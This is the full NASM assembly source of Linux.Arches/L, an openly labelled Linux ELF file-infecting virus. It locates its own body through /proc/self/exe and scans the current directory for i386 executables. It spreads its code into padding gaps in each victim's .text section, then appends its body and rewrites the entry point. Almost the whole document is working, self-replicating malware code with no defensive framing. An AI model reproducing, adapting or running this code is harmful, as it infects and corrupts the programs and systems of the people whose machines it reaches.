; By using this file, you agree to the terms and conditions set
; forth in the COPYING file which can be found at the top level
; of this distribution.
;
; Linux.Arches/L (c) herm1t@netlux.org 
; see README file for details
%define	DEBUG				; print the smile after successful infection

%include 'inc/macro.inc'
%include 'inc/system.inc'

%define	MEM_SIZE	(640*1024)	; ought to be enough for anyone

; islant_t
%define	island_offset	0
%define	island_length	4
%define	island_next	8

; code_t
%define	code_src	0		; address in the memory
%define	code_dst	4		; ptr within the victim file map
%define	code_jmpto	8		; dst of jmp/jcc/call or 0
%define	code_len	12		; length of the instruction
%define	code_next	16

; variables
%define	islands		[ebp +  0]	; linked list of free islands
%define	code		[ebp +  4]	; linked list of instructions
%define	cbrk		[ebp +  8]	; top of the memory for "malloc"
%define	filename	[ebp + 12]	; guess what?
%define	file_map	[ebp + 16]
%define	file_handle	[ebp + 20]
%define	file_length	[ebp + 24]
%define	text_addr	[ebp + 28]	; virtual address of .text section
%define	text_size	[ebp + 32]	; size of .text section
%define	text_offset	[ebp + 36]	; offset of .text section in file
%define	text_end	[ebp + 40]	; end of .text section
%define	code_ret	[ebp + 44]	; pointer to the code_t "jmp old_entry"
%define	code_vep	[ebp + 48]	; pointer to the code_t "mov esp,_start"
%define	dirent		[ebp + 52]	; pointer to the dirent structure
%define	firstcall	[ebp + 56]	; (EPO)
%define	self		[ebp + 60]	; (LOADER)
last	equ	64

		BITS	32
		CPU	386
		ORG	0x08048000

elfhdr:		db	0x7F, 'ELF',1,1,1,3,0,0,0,0,0,0,0,0
		dw	2,3			; e_type, e_machine
		dd	1			; e_version
		dd	_start			; e_entry
		dd	phdr - $$		; e_phoff
		dd	0			; e_shoff
		dd	0			; e_flags
		dw	0x34			; e_ehsize
		dw	0x20			; e_phentsize
		dw	2			; e_phnum
		dw	0			; e_shentsize
		dw	0			; e_shnum
		dw	0			; e_shstrndx
%define	sz (4096 + _end - _start)
phdr:		dd	1			; p_type
		dd	0			; p_offset
		dd	$$			; p_vaddr
		dd	$$			; p_paddr
		dd	sz			; p_filesz
		dd	sz			; p_memsz
		dd	7			; p_flags
		dd	0x1000			; p_align

		dd	1			; p_type
		dd	sz			; p_offset
		dd	0x08049000 + sz		; p_vaddr
		dd	0x08049000 + sz		; p_paddr
		dd	0			; p_filesz
		dd	0			; p_memsz
		dd	6			; p_flags
		dd	0x1000			; p_align
fake_host:	movb	eax, 1
		int	0x80
		align	4096

_start:		pusha
		; open /proc/self/exe
		push	dword 0x00006578
		push	dword 0x652f666c
		push	dword 0x65732f63
		push	dword 0x6f72702f
		movb	eax, SYS_open
		mov	ebx, esp
		movb	ecx, 0
		int	0x80
		add	esp, byte 16
		or	eax,eax
		js	near exit
		xchg	eax,ebx
		; lseek
		movb	eax, SYS_lseek
		movb	ecx, 0
		movb	edx, 2
		int	0x80
		or	eax, eax
		js	near exit
		sub	eax, VIRUS_SIZE
		; mmap
		mpush	eax, ebx, MAP_PRIVATE, PROT_READ|PROT_EXEC,VIRUS_SIZE,0
		mov	ebx, esp
		movb	eax, SYS_mmap		
		int	0x80				
		add	esp, byte 24
		cmp	eax, 0xfffff000
		ja	near exit
		lea	ebx, [eax + (run - _start)]
		jmp	ebx
		jmp	near exit
	run:	push	eax
		; esi	- size of memory
		; edi	- start of mem for the stack-like "malloc"
		; ebp	- map
		; allocate memory
		mov	eax, SYS_mmap2
		movb	ebx, 0
		mov	ecx, MEM_SIZE
		mov	edx, PROT_READ|PROT_WRITE 
		mov	esi, MAP_ANONYMOUS|MAP_PRIVATE
		xor	edi, edi
		xor	ebp, ebp
		int	0x80
		pop	edx
		cmp	eax, 0xfffff000
		ja	near exit
		mov	ebp, eax
		mov	esi, ecx

		lea	eax, [eax + last]
		mov	dirent, eax
		lea	ecx, [eax + 10]
		mov	filename, ecx
		lea	eax, [eax + sz_dirent]
		mov	cbrk, eax
		
; 1. reconstruct the code
		xor	edi, edi			; code = NULL
		mov	self, edx
		push	edx
		call	reassemble
		or	edi, edi
		jz	near free
		mov	code, edi
; 2. remove linking jumps
remove_jmps:	mov	ecx, edi			; prev = code
		mov	eax, [edi + code_next]		; c = code->next
	.loop:	mov	ebx, [eax + code_next]
		or	ebx, ebx
		jz	near .done
			mov	edx, [eax + code_src]
			cmp	byte [edx], 0xe9
			jne	near .next
			mov	edx, [ebx + code_src]
			cmp	[eax + code_jmpto], edx
			je	near .skip
	.next:	mov	[ecx + code_next], eax		; prev->next = c
		mov	ecx, eax			; prev = c
	.skip:	xchg	eax, ebx			; c = c->next
		jmp	near .loop
	.done:	mov	[ecx + code_next], eax

		mov	edi, cbrk
; 3. find the victim
search:		movb	eax, SYS_open		
		mov	ebx, filename
		mov	word [ebx], 0x2e
		movb	ecx, 0				; O_RDONLY
		int	0x80				; open
		or	eax, eax
		js	near free
		xchg	eax, ebx
.readdir:	mov	ecx, dirent
		movb	eax, SYS_readdir
		int	0x80
		dec	eax
		jnz	near .close
		call	infect
		mov	cbrk, edi
		jmp	near .readdir

.close:		movb	eax, SYS_close
		int	0x80

free:		movb	eax, SYS_munmap
		mov	ebx, ebp
		mov	ecx, esi
		int	0x80
exit:		popa
		db	0x68
__code_ret:	dd	fake_host
		ret

infect:		pusha
; 4. open victim, check it save all neccessary information
; boring stuff copied from Linux.Arian
		; open(filename, 2)
		movb	eax, SYS_open
		mov	ebx, filename
		movb	ecx, 2
		int	0x80
		or	eax, eax
		js	near return
		mov	file_handle, eax
		xchg	eax, ebx
		; lseek(h, 0, 2)
		movb	eax, SYS_lseek
		movb	ecx, 0
		movb	edx, 2
		int	0x80
		cmp	eax, 1024
		jb	near close
		mov	file_length, eax
		xchg	eax, edx
		; mmap(NULL,length,PROT_READ|PROT_WRITE,MAP_SHARED,handle,offset)
		push	ebx
		mpush	0, ebx, 1, 3, edx, 0
		movb	eax, SYS_mmap
		mov	ebx, esp
		int	0x80				
		add	esp, byte 24
		cmp	eax, 0xfffff000
		pop	ebx
		ja	near close
		xchg	eax, esi

		mov	file_map, esi
		
		; Check ELF header
		cmp	dword [esi], 0x464c457f		; ELF file?
		jne	near unmap
		cmp	dword [esi + 16], 0x00030002	; e_type == ET_EXEC &&
		jne	near unmap			; e_machine == EM_386
		mov	al, [esi + 7]			; e_ident[EI_OSABI]
		cmp	al, 3				; Linux?
		je	near .header_ok
		cmp	al, 0				; None? ;-)
		jne	near unmap
.header_ok:	; find string table
		movzx	eax, word [esi + e_shstrndx]
		or	eax, eax
		jz	near unmap			;SHN_UNDEF
		lea	eax, [eax * 4 + eax]
		lea	eax, [eax * 8]
		add	eax, [esi + e_shoff]	; eax = e_shstrndx * 40 + e_shoff
		mov	edx, [esi + eax + sh_offset]
		add	edx, esi
		; edx contain pointer to the string table
		; find .text section
		mov	edi, [esi + e_shoff]
		add	edi, esi
		movzx	ecx, word [esi + e_shnum]
		or	ecx, ecx
		jz	near unmap
.find_text_sec:	mov	eax, [edi + sh_name]
		lea	eax, [eax + edx]
		cmp	dword [eax + 1], 'text'
		je	near .found_sec
		add	edi, sizeof_shdr
		dec	ecx
		jnz	near .find_text_sec
		; save sh_offset, sh_size and sh_addr
.found_sec:	mov	eax, [edi + sh_addr]
		mov	text_addr, eax
		mov	ecx, [edi + sh_size]
		mov	text_size, ecx
		mov	edx, [edi + sh_offset]
		mov	text_offset, edx

; 5. find function padding bytes
find_islands:	add	esi, edx		; text_offset
		mov	eax, esi
		add	eax, ecx		; text_size
		mov	text_end, eax
		movb	eax, 0
		mov	islands, eax
%ifdef	EPO
		mov	firstcall, eax
%endif		
.next:		cmp	esi, text_end
		jae	near .done
		
%ifdef	EPO
		mov	eax, firstcall
		or	eax, eax
		jnz	near .skip
		cmp	byte [esi], 0xe8
		jne	near .skip
		mov	firstcall, esi
	.skip:
%endif		
	
%macro	sd	3
	%if %2==1
		push	eax
	%else
		push	byte %2
	%endif
	push	dword %3
	push	byte %1
%endmacro
		push	ebp
		mov	ecx, esp
		movb	eax, 1
		sd	7, 1,0x5d30a0da
		sd	8, 1,0xb7109f48
		sd	9, 1,0x6ed89f27
		sd	10,1,0x74d8dd25
		sd	11,1,0x34a6685b
		sd	12,1,0x19fbc1f4
		sd	13,1,0xd6b6dcfd
		sd	15,2,0xd5cae9dc
		sd	14,1,0xe4ad564a
		sd	15,1,0x11d50a7f
		movb	ebp, 10
	.find:		pop	edx			; length
			push	edx
			push	esi
			call	crc32
			pop	ebx			; crc32
			cmp	eax, ebx
			je	near .found
			pop	eax			; skip shift
		dec	ebp
		jnz	near .find
		mov	esp, ecx
		pop	ebp

		; move to the next instruction
		push	esi
		call	mlde32
		add	esp, byte 4
		or	eax, eax
		jbe	near unmap
		add	esi, eax
		jmp	near .next

.found:		pop	ebx				; patterns[i].shift
		mov	esp, ecx
		pop	ebp
		; ebx - shift
		; edx - length
		push	byte 12
		call	malloc				; p 		= (island_t*)__malloc(sizeof(island_t));
		mov	[eax + island_offset], esi	; p->offset	= off + patterns[i].shift;
		add	[eax + island_offset], ebx
		mov	[eax + island_length], edx	; p->length	= patterns[i].length - patterns[i].shift;
		sub	[eax + island_length], ebx
		xor	ecx, ecx
		mov	[eax + island_next], ecx	; p->next	= NULL;
		mov	ecx, islands			; if (islands == NULL) {
		or	ecx, ecx
		jnz	near .else
			mov	islands, eax		; 	islands = p;
			jmp	near .endif
	.else:						; } else {
			mov	ecx, edi
			mov	[ecx + island_next], eax;	tail->next = p; 
	.endif:						; }
		mov	edi, eax			; tail = p;
		add	esi, ebx			; off += patterns[i].length;
		jmp	near .next
.done:

; 6. inject code into file
inject:		cld
		mov	esi, islands	;i
		or	esi, esi
		jz	near unmap
		mov	edi, code	;c
		xor	edx, edx	;l

	.for:	or	edi, edi
		jz	near .done
		
		mov	eax, edx
		add	eax, [edi + code_len]
		mov	ebx, [esi + island_length]
		lea	ebx, [ebx - 5]
		cmp	eax, ebx
		ja	near .else

		mov	eax, [esi + island_offset]
		add	eax, edx
		mov	[edi + code_dst], eax		; the pointer to new location in mmaped file
		; copy this instruction
		mov	ecx, [edi + code_len]
		pusha
		mov	esi, [edi + code_src]
		mov	edi, [edi + code_dst]
		rep	movsb
		popa
		; go tothe next one
		add	edx, ecx			;[edi + code_len]
		mov	edi, [edi + code_next]
		jmp	near .for
	.else:	; the instruction doesn't fit in the current island
		; pad island with NOPs
		pusha
		mov	edi, [esi + island_offset]
		add	edi, edx		
		mov	ecx, [esi + island_length]
		sub	ecx, edx
		mov	al, 0x90
		rep	stosb
		popa
		; generate jump from this island to the next one or die of
		; lacking free space :-)
		mov	eax, [esi + island_next]
		or	eax, eax
		jz	near unmap
		mov	eax, [eax + island_offset]
		mov	ebx, [esi + island_offset]
		mov	ecx, eax
		sub	ecx, ebx
		sub	ecx, edx
		lea	ecx, [ecx - 5]
		; eax = i->next->offset
		; ebx = i->offset
		mov	byte	[ebx + edx + 0], 0xe9
		mov	dword 	[ebx + edx + 1], ecx
		xor	edx, edx
		mov	esi, [esi + island_next]
		jmp	near .for
.done:

; 7. fix addresses
fixrel:		mov	esi, code
	.for:	or	esi, esi
		jz	near .end
			mov	eax, [esi + code_jmpto]
			or	eax, eax
			jz	near .next
			mov	edi, code
		.for2:	or	edi, edi
			jz	near unmap
				mov	eax, [edi + code_src]
				cmp	[esi + code_jmpto], eax
				jne	near .next2
					mov	edx, [esi + code_len]
					mov	ebx, [esi + code_dst]
					add	ebx, edx
					mov	eax, [edi + code_dst]
					sub	eax, [esi + code_dst]
					sub	eax, edx
					mov	dword [ebx - 4], eax
					jmp	near .next
		.next2:	mov	edi, [edi + code_next]
			jmp	near .for2			
	.next:	mov	esi, [esi + code_next]
		jmp	near .for
	.end:

; 8. final step: adjust headers (or in the case of EPO single instruction)
; set up variables within the body of the virus and get outta here

		; write virus body at page aligned offset
		movb	eax, SYS_ftruncate
		mov	ebx, file_handle
		mov	ecx, file_length
		add	ecx, 4095
		and	ecx, 0xfffff000
		mov	edi, ecx
		int	0x80
		or	eax, eax
		jnz	near unmap
		movb	eax, SYS_lseek
		movb	edx, 0				;SEEK_SET
		int	0x80
		cmp	eax, ecx
		jne	near unmap
		movb	eax, SYS_write
		mov	ecx, self
		mov	edx, VIRUS_SIZE
		int	0x80
		cmp	eax, edx
		jne	near unmap
		movb	eax, SYS_lseek
		mov	ecx, -VIRUS_SIZE + (__code_ret - _start)
		movb	edx, 1				; SEEK_CUR
		int	0x80
		mov	esi, file_map
		mov	edx, [esi + e_entry]
		push	edx
		mov	eax, SYS_write
		mov	ebx, file_handle
		mov	ecx, esp
		movb	edx, 4
		int	0x80
		add	esp, edx
		cmp	edx, eax
		jne	near unmap
		; new_entry = code->dst - file_map + text_addr - text_offset
		mov	eax, code		
		mov	eax, [eax + code_dst]
		sub	eax, esi
		sub	eax, text_offset
		add	eax, text_addr
		; set new entry point
		mov	[esi + e_entry], eax

%ifdef DEBUG
		push	0x10292d3a
		movb	eax, 4
		movb	ebx, 1
		mov	ecx, esp
		movb	edx, 3
		int	0x80
		pop	eax
%endif
		
unmap:		movb	eax, SYS_munmap
		mov	ebx, file_map
		mov	ecx, file_length
		int	0x80
close:		movb	eax, SYS_close
		mov	ebx, file_handle
		int	0x80
return:		popa
		ret

reassemble:	pusha
		mov	esi, [esp + 36]

.for:		; do we have current offset in the list?
		mov	eax, edi
.already:	or	eax, eax
		jz	near .go
			cmp	[eax + code_src], esi
			je	near .return
		mov	eax, [eax + code_next]
		jmp	near .already
.go:
		; eax - c
		; edx - op_len		
		; esi - ptr within .text
		; edi - code
		push	esi
		call	mlde32
		pop	ebx
		or	eax, eax
		jbe	near .return
		xchg	eax, edx

		push	byte 20
		call	malloc					; c = (code_t*)__malloc(sizeof(code_t));
		mov	[eax + code_src], esi			; c->src = ptr;
		xor	ebx, ebx
		mov	[eax + code_jmpto], ebx			; c->jmpto = 0;
		mov	[eax + code_next], ebx			; c->next = NULL;
		mov	[eax + code_len], edx
		
		or	edi, edi
		jz	near .null
		mov	ebx, [edi + code_src]
		cmp	[eax + code_src], ebx
		jae	near .else
.null:		mov	[eax + code_next], edi
		mov	edi, eax
		jmp	near .endi
.else:		push	ebp
		mov	ebp, edi
	.while:	mov	ecx, [ebp + code_next]
		or	ecx, ecx
		jz	near .endw
		mov	ebx, [eax + code_src]
		cmp	[ecx + code_src], ebx
		jae	near .endw
		mov	ebp, [ebp + code_next]
		jmp	near .while
	.endw:	mov	ebx, [ebp + code_next]
		mov	[eax + code_next], ebx
		mov	[ebp + code_next], eax
		pop	ebp
.endi:
		; RET/RETN? return
		mov	cx, [esi]
		cmp	cl, 0xc3
		je	near .return
		cmp	cl, 0xc2
		je	near .return

.not_vep:	; JMP/CALL/Jcc near?
		cmp	cl, 0xe9
		je	near .rel
		cmp	cl, 0xe8
		je	near .rel
		cmp	cl, 0x0f
		jne	near .not_rel
		and	ch, 0xf0
		cmp	ch, 0x80
		jne	near .not_rel
			; edx - c->length
			; ebx - c->jmpto
	.rel:		mov	ebx, esi
			add	ebx, edx
			add	ebx, [ebx - 4]
			mov	[eax + code_jmpto], ebx		; c->jmpto = ptr + op_len + c->diza.disasm_data_l[0];
			cmp	byte [esi], 0xe9
			jne	near .not_jmp
				mov	esi, ebx		; ptr = c->jmpto
				jmp	near .for		; continue;
	.not_jmp:	push	ebx
			call	reassemble			; reassemble(c->jmpto);
.not_rel:	add	esi, edx				; ptr += op_len;
		jmp	near .for
.return:	mov	[esp], edi
		popa
		retn	4

%include 'inc/mlde32.inc'

crc32:		pusha
		xor	ebx, ebx
		dec	ebx
		cld
		mov	esi, [esp + 36]
		mov	ecx, [esp + 40]
		xor	eax, eax
.l0:		lodsb
		xor	ebx, eax
		movb	edx, 8
.l1:		rcr	ebx, 1
		jnc	near .l2
		xor	ebx, 0xedb88320
.l2:		dec	edx
		jnz	near .l1
		dec	ecx
		jnz	near .l0
		not	ebx
		mov	[esp + 28], ebx
		popa
		retn	8

malloc:		push	ebx
		mov	ebx, [esp + 8]
		mov	eax, cbrk
		add	cbrk, ebx
		pop	ebx
		retn	4
VIRUS_SIZE	equ	$-_start
_end:
